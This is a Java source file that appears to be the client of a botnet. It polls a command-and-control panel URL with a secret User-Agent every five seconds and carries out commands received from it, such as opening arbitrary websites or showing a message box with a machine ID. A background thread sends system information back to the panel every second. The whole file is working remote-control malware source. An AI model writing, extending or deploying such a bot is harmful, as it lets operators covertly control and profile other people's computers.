/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

package mud;

import mud.Commands.SystemInformation;
import mud.Commands.BasicCommands;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
/**
 *
 * @author SaturnsVoid
 */
public class Mud implements Runnable{

    public static final String URL = "http://127.0.0.1/mud/cmd.php"; //URL to cmd.php of the Control Panel
    public static final String AGENT = "83dh3ka"; //User Agent to allow the bot to connect to the Control Panel
    public static final int CMDTIMER = 5 * 1000; // Time to wait before checking for new commands from the Control Panel
    public static final int SENDTIMER = 1000; // Time to wait before sending information to the Control Panel
    /**
     * @param args the command line arguments
     */
    private String Agent;
    private String Url;
    private String Last;
    private int CMDTimer;
    private int SendTimer;

    public static void main(String [] args) {
        Mud CommandWorker = new Mud();
        (new Thread(CommandWorker)).start();
    }
    
    public Mud() {
        this.Agent = AGENT;
        this.Url = URL;
        this.CMDTimer = CMDTIMER;
        this.SendTimer = SENDTIMER;
        Thread InfoUpdate = new Thread(InformationUpdate);
        InfoUpdate.start();
    }
    @Override
    public void run() {
        try {
            System.out.println("Awake, Doing work...");
            while(true) {      
            try {
                HttpURLConnection Worker = (HttpURLConnection)(new URL(this.Url)).openConnection();        
                Worker.setRequestProperty("User-Agent", this.Agent);     
                BufferedReader Reader = new BufferedReader(new InputStreamReader(Worker.getInputStream()));
                String line;    
                while((line = Reader.readLine()) != null) {
                   if (line.equals(Last)){
                       System.err.println("Same command as last!");
                   } else {
                       this.Last = line;
                      String[] args = line.split("\\|");
                        BasicCommands Commands = new BasicCommands();
                        SystemInformation Info = new SystemInformation();
                            if(args[0].equals("0") && args.length == 2) {
                                // Show Message Box
                                Commands.ShowMSGBOX(Info.CreateID());
                            } else if ((args[0].equals("1") && args.length == 2)){
                                // Open Website
                                Commands.OpenWebsite(args[1]);
                            } else if ((args[0].equals("2") && args.length == 2)){
                                    
                            } else{
                                System.err.println("Unknown Command!");
                            }
                   }               
                }   
                Reader.close();
                } catch(IOException e) {
                    // Unable to connect to panel
                 //e.printStackTrace();
                }
            System.out.println("Sleeping for 5 seconds...");
            Thread.sleep(CMDTimer);
            } 
        } catch (InterruptedException e) {
            //e.printStackTrace();
        }
              
    }  
    
    Runnable InformationUpdate = new Runnable() {
        SendInformation SendInfo = new SendInformation();
        @Override
        public void run() {
            try {
                while (true) {
                   SendInfo.Tic();
                    Thread.sleep(SendTimer);
                }
            } catch (InterruptedException e) {
                //e.printStackTrace();
            }
        }
    };
 }
